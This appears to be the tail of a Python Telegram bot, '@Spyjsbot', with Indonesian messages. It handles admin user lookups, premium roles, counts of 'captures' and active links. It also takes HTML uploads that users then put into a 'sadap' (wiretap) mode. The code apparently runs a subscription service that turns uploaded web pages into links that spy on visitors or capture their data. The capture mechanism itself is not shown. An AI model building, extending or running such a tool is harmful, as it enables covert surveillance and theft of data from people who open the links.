            await update.message.reply_text("❌ Format tanggal salah. Pakai YYYY-MM-DD.",
                                            reply_markup=kb_admin())
        _user_state[uid]=None; _user_data[uid]={}

    elif state == "a_await_search":
        data=db_read()
        ud=data["users"].get(text)
        if not ud:
            await update.message.reply_text(f"❌ User `{text}` tidak ditemukan.",
                                            parse_mode="Markdown",reply_markup=kb_admin())
        else:
            r=ud.get("role","free")
            badge={"admin":"👑","premium":"💎","free":"🆓"}.get(r,"🆓")
            user_links=[l for l in _links if str(l["owner"])==text]
            teks=(f"🔍 *Hasil Pencarian:*\n\n"
                  f"ID: `{text}`\n"
                  f"Role: {badge} {r}\n"
                  f"Join: {ud.get('joined','?')}\n"
                  f"Total capture: {ud.get('cap_total',0)}\n"
                  f"Premium s/d: {ud.get('premium_until','∞') or '∞'}\n"
                  f"Link aktif: {len(user_links)}")
            await update.message.reply_text(teks,parse_mode="Markdown",reply_markup=kb_admin())
        _user_state[uid]=None

    elif state == "a_await_detail":
        data=db_read()
        ud=data["users"].get(text)
        if not ud:
            await update.message.reply_text(f"❌ User `{text}` tidak ditemukan.",
                                            parse_mode="Markdown",reply_markup=kb_admin())
        else:
            r=ud.get("role","free")
            badge={"admin":"👑","premium":"💎","free":"🆓"}.get(r,"🆓")
            user_links=[l for l in _links if str(l["owner"])==text]
            teks=(f"📝 *Detail User:*\n\n"
                  f"ID: `{text}`\n"
                  f"Role: {badge} {r}\n"
                  f"Join: {ud.get('joined','?')}\n"
                  f"Total capture: {ud.get('cap_total',0)}\n"
                  f"Premium s/d: {ud.get('premium_until','∞')}\n"
                  f"Link aktif: {len(user_links)}")
            await update.message.reply_text(teks,parse_mode="Markdown",reply_markup=kb_admin())
        _user_state[uid]=None

async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid   = str(update.effective_user.id)
    state = _user_state.get(uid)
    if state != "await_html": return
    doc = update.message.document
    if not doc.file_name.endswith(".html"):
        await update.message.reply_text("❌ Harus file .html"); return
    await update.message.reply_text("⏳ Memproses file...")
    try:
        tfile = await context.bot.get_file(doc.file_id)
        raw   = (await tfile.download_as_bytearray()).decode("utf-8",errors="replace")
        _user_data[uid]["raw_html"]=raw
        _user_state[uid]="await_mode"
        await update.message.reply_text("✅ File diterima!\n\nPilih mode sadap:",reply_markup=kb_mode())
    except Exception as e:
        await update.message.reply_text(f"❌ Gagal: {e}")

# ------------------------------------------------------------------ #
#  MAIN
# ------------------------------------------------------------------ #
def main():
    print_banner()
    threading.Thread(target=timer_thread,daemon=True).start()
    print(f"\n\n  Buka @Spyjsbot → /start\n")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
